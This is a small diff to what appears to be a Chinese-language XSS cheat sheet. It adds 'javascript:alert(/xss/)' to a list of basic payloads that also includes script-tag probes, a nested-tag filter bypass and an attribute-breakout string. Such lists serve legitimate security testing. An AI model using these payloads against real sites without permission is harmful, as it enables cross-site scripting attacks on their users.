@@ -126,6 +126,7 @@
    - 常見Payload
        ```js
          #Basic
+        javascript:alert(/xss/)
         <script>alert('XSS')</script>
         <scr<script>ipt>alert('XSS')</scr<script>ipt>
         "><script>alert('XSS')</script>
